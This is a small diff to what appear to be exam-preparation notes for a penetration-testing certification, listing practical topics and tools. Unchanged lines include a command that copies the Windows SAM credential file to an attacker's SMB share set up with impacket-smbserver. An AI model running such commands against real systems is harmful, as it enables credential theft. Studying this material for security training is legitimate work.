@@ -7,8 +7,8 @@ python -m http.server 80
    On kali: impacket-smbserver share .
    win: copy SAM \\10.10.14.17\share\SAM
 chown -R www-data:www-data /var/www/html/share/  
-chmod -R 755 /var/www/html/share/  
-auxiliary/scanner/smb/smb_version #smb version check
+chmod -R 755 /var/www/html/share/ 
+#APK Permission Checker: https://sisik.eu/apk-tool
 
 [Exam Topics +]
 Learn when to use the exact tool per question  
@@ -57,9 +57,6 @@ Learn when to use the exact tool per question
 5. Encryption attack techniques  
 6. SQL injection exploitation  
 7. Packet sniffing with Wireshark  
-
-[Practical Exam Useful Links +]
-1. APK Permission Checker: https://sisik.eu/apk-tool  
 =================================================================
 [Theory (4hrs, 125 MCQ)]
 ------------------------
